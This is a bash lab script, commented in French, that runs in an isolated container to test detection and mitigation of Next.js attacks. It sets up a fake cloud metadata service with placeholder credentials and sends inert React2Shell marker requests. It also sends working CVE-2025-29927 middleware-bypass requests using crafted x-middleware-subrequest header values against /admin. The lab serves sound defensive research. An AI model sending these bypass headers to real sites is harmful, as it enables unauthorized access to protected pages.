#!/bin/bash
# Exécuté DANS le conteneur (--network none). Marqueurs de requête seulement, aucune charge d'exploitation.
set -u
ip addr add 169.254.169.254/32 dev lo
mkdir -p /imds/latest/meta-data/iam/security-credentials
echo -n "lab-role" > /imds/latest/meta-data/iam/security-credentials/index.html
echo '{"AccessKeyId":"FAKE-LAB-KEY","SecretAccessKey":"FAKE-LAB-SECRET","Token":"FAKE"}' > /imds/latest/meta-data/iam/security-credentials/lab-role
(cd /imds && python3 -m http.server 80 --bind 169.254.169.254 >/tmp/imds.log 2>&1 &)
nginx
start_next(){ LAB_IMAGES=$1 npm start >/tmp/next.log 2>&1 & for i in $(seq 30); do curl -s -o /dev/null 127.0.0.1:3000 && break; sleep 1; done; }
req(){ local label=$1; shift; printf '%-58s ' "$label"; curl -s -o /tmp/body -w '%{http_code} ' "$@"; grep -q ADMIN-SECRET-PAGE /tmp/body && echo "-> page admin servie" || echo "-> $(head -c 90 /tmp/body | tr '\n' ' ')"; }
start_next default
echo "== EXP-001 CVE-2025-29927, accès direct à /admin (sans cookie) via nginx :8080"
req "A. requête normale" http://127.0.0.1:8080/admin
req "B. en-tête envoyé 5 fois, valeur 'middleware'" http://127.0.0.1:8080/admin $(for i in 1 2 3 4 5; do printf -- '-H x-middleware-subrequest:middleware '; done)
req "C. 1 en-tête, valeur 'middleware'" -H 'x-middleware-subrequest: middleware' http://127.0.0.1:8080/admin
req "D. 1 en-tête, valeur répétée 5 fois" -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' http://127.0.0.1:8080/admin
req "E. 1 en-tête, valeur 'src/middleware' x5 (mauvais chemin)" -H 'x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware' http://127.0.0.1:8080/admin
echo "== EXP-002 mitigation proxy (:8081, en-tête retiré)"
req "D'. valeur répétée 5 fois, via proxy filtrant" -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' http://127.0.0.1:8081/admin
# EXP-003 (SSRF /_next/image) : voir run-exp3.sh, qui démarre Next.js avec chaque configuration
echo "== EXP-004 marqueurs React2Shell (corps inerte, aucune charge)"
BODY=$'--bissa_cve_boundary\r\nContent-Disposition: form-data; name="a"\r\n\r\n1\r\n--bissa_cve_boundary--\r\n'
req "I. POST / Next-Action:x boundary bissa" -X POST -H 'Next-Action: x' -H 'Content-Type: multipart/form-data; boundary=bissa_cve_boundary' --data-binary "$BODY" http://127.0.0.1:8080/
req "J. idem + x-action-id: x (variante 5)" -X POST -H 'Next-Action: x' -H 'x-action-id: x' -H 'Content-Type: multipart/form-data; boundary=bissa_cve_boundary' --data-binary "$BODY" http://127.0.0.1:8080/
req "K. idem Transfer-Encoding chunked (variante 1)" -X POST -H 'Next-Action: x' -H 'Transfer-Encoding: chunked' -H 'Content-Type: multipart/form-data; boundary=bissa_cve_boundary' --data-binary "$BODY" http://127.0.0.1:8080/
sleep 1
echo "== Journal nginx par défaut (combined)"; cat /var/log/nginx/default.log
echo "== Journal enrichi JSON"; cat /var/log/nginx/detect.json
echo "== Journal enrichi, proxy filtrant"; cat /var/log/nginx/detect-mitigated.json
